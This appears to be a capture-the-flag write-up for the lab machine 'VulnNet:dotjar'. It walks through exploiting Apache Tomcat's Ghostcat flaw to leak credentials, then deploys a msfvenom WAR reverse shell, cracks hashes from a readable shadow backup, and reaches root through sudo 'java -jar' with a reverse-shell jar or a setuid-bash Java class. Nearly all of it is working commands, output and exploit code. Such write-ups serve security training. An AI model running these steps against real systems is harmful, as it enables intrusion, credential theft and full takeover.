@@ -1,0 +1,209 @@
+VulnNet:dotjar
+
+NMAP RESULTS:
+=====================
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 03:50 EDT
+Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 7.00% done; ETC: 03:52 (0:01:46 remaining)
+Nmap scan report for 10.10.176.206
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE VERSION
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+| ajp-methods: 
+|_  Supported methods: GET HEAD POST OPTIONS
+8080/tcp open  http    Apache Tomcat 9.0.30
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/9.0.30
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=4/24%OT=8009%CT=1%CU=37710%PV=Y%DS=2%DC=T%G=Y%TM=6083C
+OS:DFF%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)S
+OS:EQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7
+OS:%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W
+OS:2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NN
+OS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
+OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
+OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
+OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
+OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 65129/tcp)
+HOP RTT       ADDRESS
+1   156.87 ms 10.8.0.1
+2   157.21 ms 10.10.176.206
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 67.88 seconds
+
+
+ABOUT VULNERABILITY:
+==============================
+The Apache Ghostcat vulnerability is a file inclusion vulnerability which came out in the first quarter of this year while the world was gearing up for a lockdown fight up against the coronavirus.
+It allows any attacker to read files such as configuration files , test files or any other tomcat directory files . In addition, if a victim website permits any user to upload files, an attacker can upload the file containing malicious JSP code to the server and then include the uploaded file by exploiting the Ghostcat vulnerability, resulting in remote code execution. Well like the coronavirus’s family of viruses this ghostcat bug has also been there since a long long time and has managed to be undiscovered until the recent past. The context of the short blog post is to comprehend, identify and exploit this notorious bug.
+=============================
+
+
+GOT THIS SCRIPT FROM GITHUB HERE:
+https://github.com/00theway/Ghostcat-CNVD-2020-10487
+===================================
+┌──(root💀kali)-[/opt/Ghostcat-CNVD-2020-10487]
+└─# python3 ajpShooter.py http://10.10.176.206:8080/ 8009 /WEB-INF/web.xml read
+
+--[snip]--
+
+  metadata-complete="true">
+
+  <display-name>VulnNet Entertainment</display-name>
+  <description>
+     VulnNet Dev Regulations - mandatory
+ 
+1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
+2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
+-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
+-- Your project scope is written in the contract.
+3. Developer access is granted with the credentials provided below:
+ 
+    webdev:Hgj3LA$02D$Fa@21
+ 
+GUI access is disabled for security reasons.
+ 
+4. All further instructions are delivered to your business mail address.
+5. If you have any additional questions contact our staff help branch.
+  </description>
+
+</web-app>
+
+
+===================
+    webdev:Hgj3LA$02D$Fa@21
+===================
+
+MAYBE THESE ARE THE HTTP AUTHENTICATION CREDS
+
+NOW USING THESE CREDS WE CAN UPLOAD OUR REVERSE SHELL PAYLOAD WHICH WE CAN GENERATE USING MSFVENOM AS IT SHOULD BE A .WAR FILE
+THEN USING CURL WE CAN UPLOAD YOUR REVERSE SHELL AND THEN DEPLOY IT TO GET OUT REVERSE SHELL BACK ON OUT LOCAL MACHINE
+
+UPLOADING THE PAYLOAD:
+=============================
+# curl --upload-file shell.war -u webdev:'Hgj3LA$02D$Fa@21' "http://10.10.100.161:8080/manager/text/deploy?path=/debug&update=true" 
+OK - Deployed application at context path [/debug]
+                                                                                                                                           
+# curl http://10.10.100.161:8080/debug  
+
+GOT THE REVERSE SHELL:
+============================
+# nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.100.161] 57642
+
+id
+uid=1001(web) gid=1001(web) groups=1001(web)
+
+FOUND A BACKUP OWNED BY ROOT BUT READ BY US IN /var/backups DIRECTORY:
+-rw-r--r--  1 root root       485 Jan 16 13:44 shadow-backup-alt.gz
+
+
+AFTER COPYING THE FILE TO OUR SERVER:
+┌──(root💀kali)-[~/vulnNet]
+└─# cat shadow-backup-alt                                                                                                            
+root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
+--[snip]--
+jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
+web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
+
+
+WE GOT THE HASHES
+
+I CAN CRACK ONLY ONE PASSWORD:
+=================================
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+794613852        (jdk-admin)
+1g 0:00:03:02 0.55% (ETA: 16:31:45) 0.005482g/s 518.6p/s 662.4c/s 662.4C/s 122471..09101988
+Use the "--show" option to display all of the cracked passwords reliably
+Session aborted
+
+
+GOT THE USER FLAG
+
+NOW USING SUDOERS:
+==============================
+jdk-admin@vulnnet-dotjar:~$ sudo -l
+Password: 
+Matching Defaults entries for jdk-admin on vulnnet-dotjar:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jdk-admin may run the following commands on vulnnet-dotjar:
+    (root) /usr/bin/java -jar *.jar
+jdk-admin@vulnnet-dotjar:~$ 
+
+SO I CREATE A PAYLOAD USING MSFVENOM:
+└─# msfvenom -p java/shell_reverse_tcp LHOST=10.8.73.218 LPORT=4444 -f jar -o shell.jar
+Payload size: 7508 bytes
+Final size of jar file: 7508 bytes
+Saved as: shell.jar
+
+
+
+THEN UPLOAD THE PAYLOAD TO THE SERVER THEN RUN THE JAVA COMAMND USING SUDO
+WE GOT THE ROOT SHELL!!
+
+└─# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.100.161] 57396
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+GOT THE ROOT FLAG
+
+
+ANOTHER MANUAL WAY (WITHOUT USING MSFVENOM):
+==================================================
+
+WE CAN CREATE OUR OWN PAYLOAD WHICH IS A JAVA CODE:
+======================================================
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.IOException;
+
+public class EXPLOIT {
+        public static void main(String[] args) {
+                String command = "chmod +s /bin/bash";
+                // ANY STRING , FOR EXAMPLE REVERSE SHELL ALSO WORKS
+                try {
+                    Process process = Runtime.getRuntime().exec(command);
+
+                    BufferedReader reader = new BufferedReader(
+                            new InputStreamReader(process.getInputStream()));
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        System.out.println(line);
+                    }
+
+                    reader.close();
+
+                } catch (IOException e) {
+                    e.printStackTrace();
+                }
+        }
+}
+======================================================
+THEN FOLLOW THE STEPS TO COMPILE THE CODE AND EXECUTE THE JAR FILE:
+// HOW TO COMPILE THE JAVA CODE:
+
+
+//javac exploit.java
+//jar cfe exploit.jar exploit exploit.class
+//sudo -u root /usr/bin/java -jar exploit.jar 
+//bash -p
